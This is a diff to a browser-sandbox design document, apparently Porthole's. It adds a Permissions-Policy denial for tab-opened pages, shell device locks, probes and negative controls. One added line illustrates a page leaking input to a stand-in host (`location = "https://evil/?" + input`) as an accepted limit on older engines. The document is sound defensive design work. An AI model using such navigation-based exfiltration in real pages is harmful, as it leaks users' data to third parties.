@@ -4417,8 +4417,14 @@ but `.tab-navigation`, on every engine. Measured then, on a tab: `documentPictur
      itself (HTML, "allowed by sandboxing to navigate": the source is the target), top-level too,
      and no CSP governs it (`navigate-to` was dropped). The shell's guard (P079) is that wall on a
      tab, as in a served frame (`served.domain.tab-navigation`, `served.domain.self-navigation`:
-     the guard, unchanged here, holds both; `navigate-guard` fails both). An engine without the Navigation API has no wall for it on a
-     tab: P079's fallback is the embedding page's `frame-src`, and a tab has no embedding page.
+     the guard, unchanged here, holds both; `navigate-guard` fails both).
+   - *Accepted limit: an engine without the Navigation API.* There the guard gets no events, and
+     a page on a tab can navigate itself away with data in the address (`location =
+     "https://evil/?" + input`): P079's fallback is the embedding page's `frame-src`, and a tab has
+     no embedding page. The engines Porthole gates on (Chromium 153, WebKit 26.6, Firefox 155)
+     have the API; older Safari and Firefox releases don't. Accepted: nothing else in a
+     page can stop its own navigation (no CSP for it, `Location` can't be wrapped), and a host
+     that must cover such browsers shows public pages in its own frame, where `frame-src` holds.
 2. **`allow-same-origin`: needed, and safe there.**
    - *Needed*: without it the page is an opaque origin. Its own files' requests are then
      cross-site, so a tab's `SameSite=Lax` session cookie isn't sent and every file is refused; its
@@ -4435,7 +4441,21 @@ but `.tab-navigation`, on every engine. Measured then, on a tab: `documentPictur
      popups, no frames: `frame-src 'none'` and the shell's frame guard; no navigation of another
      window; `openInTab` cuts the tab's opener itself). A sibling label stays another origin
      (P047's same-site caveat unchanged).
-3. **The shell, on a tab** (`window.top === window`): `window.open` answers null (a `_self`
+3. **Every served page denies itself what its frame's `allow` doesn't grant**, in a
+   `Permissions-Policy` header (`servedPermissionsPolicy`): each feature of `FRAME_DENIED_FEATURES`
+   (the camera, the microphone, the screen, location, full screen, the clipboard, payment, USB,
+   serial, HID, Bluetooth, MIDI, sensors, credentials, web share, autoplay, wake lock and the
+   rest whose default allowlist is `'self'`) `=()`, less what `delegatedFeatures` says the frame's
+   `allow` grants (nothing, outside url mode). In a frame it changes nothing: a cross-origin
+   frame has none of these unless its `allow` names them, and a frame's features are the
+   intersection of the two; `*`-default features (a video's picture-in-picture) are left out for
+   that reason. On a tab it is the only denial. The agreement test holds the header to the
+   frame's `allow` for every preset. Only Chromium applies it here (measured with the shell's
+   locks out, `device-locks`: WebKit and Firefox gave a tab location the browser had granted), so
+   the shell, on a tab only, also refuses `getUserMedia`, `getDisplayMedia`, `getCurrentPosition`, `watchPosition`
+   and `requestFullscreen` as a denial does, at once, without a prompt: the manual's "camera,
+   microphone, location denied without asking" and "full screen closed" now hold on a tab too.
+4. **The shell, on a tab** (`window.top === window`): `window.open` answers null (a `_self`
    target stays a navigation of the document, which the guard decides), and
    `DocumentPictureInPicture.prototype.requestWindow` rejects, both fixed in place. For
    `window.open` the second wall, behind the sandbox, for an edge that drops or rewrites the
@@ -4443,17 +4463,21 @@ but `.tab-navigation`, on every engine. Measured then, on a tab: `documentPictur
    sandbox refuses it, on Chromium (`InvalidStateError`) and Firefox (`UnknownError`, no window
    made). In a frame the frame's sandbox stays the wall, and
    row 6's `sandbox` control still fails `6.open`.
-4. **Probes**, in the served conformance suite (shipped: `defineHostConformance` runs them against
+5. **Probes**, in the served conformance suite (shipped: `defineHostConformance` runs them against
    an app's real page and edge): `served.domain.tab-window-open`, `.tab-escapes`, `.tab-opener`,
-   `.tab-navigation` (`TAB_CASES`, one per wall), and `served.domain.self-navigation` (a served
+   `.tab-navigation`, `.tab-devices` (location, camera and microphone, with the browser's
+   permission granted, and full screen after a click: each refused) (`TAB_CASES`, one per wall),
+   and `served.domain.self-navigation` (a served
    frame sends itself to an outside site, which the embedding page's `frame-src` stops, and to
    another content origin, which only the guard does: the served suite had no self-navigation
    probe; the leak suite's ran in opaque frames only). Porthole's own (`leak/served/tab.spec.ts`):
    the four against the reference serving, a file set's page on a tab (its module, its fetch and
    its links to its own pages work; nothing else opens), and a frame's sealed address opened on a
-   tab. Negative controls (P032): `tab-sandbox` (the harness drops the header's `sandbox`) and
-   `window-open` (the shell's tab locks taken out), in `scripts/controls.ts`.
-5. **Checked unchanged**: the url-mode relay (`fromUpstream` adds `frame-ancestors` only;
+   tab. Negative controls (P032): `tab-sandbox` (the harness drops the header's `sandbox`),
+   `window-open` (the shell's window locks on a tab taken out), `permissions-policy` (the harness
+   drops the header) and `device-locks` (the shell's device locks taken out), in
+   `scripts/controls.ts`.
+6. **Checked unchanged**: the url-mode relay (`fromUpstream` adds `frame-ancestors` only;
    `served.url.tab`); redirect entry and the handoff (redirects and Porthole's pages, never
    content's: `files.spec.ts` on a tab, the kit's entry cases); a frame's sealed address (the same
    flags; `files.spec.ts` in a frame on WebKit, its renewal); a set's pages opening each other
@@ -4468,6 +4492,6 @@ A sandbox on a url-mode app's tab: the app is code the host trusts to its origin
 P037), and needs what it would take away (sign-in popups, form posts, downloads).
 **Revisit when** an engine lets a CSP govern a document's own navigation (the guard would get a
 second wall on a tab); a host needs a served page to open windows from a tab (through the host,
-`links.open`/`openLink`, never `allow-popups`); or a tab's other powers come up: Permissions
-Policy has no tab equivalent of the frame's `allow` here yet (a tab may ask for the camera,
-location or full screen under the content origin's name; nothing it learns has a way out).
+`links.open`/`openLink`, never `allow-popups`); the platform adds a powerful feature with a
+`'self'` default (it joins `FRAME_DENIED_FEATURES`); or WebKit and Firefox apply
+`Permissions-Policy` to these features (the shell's device locks become the second wall there too).
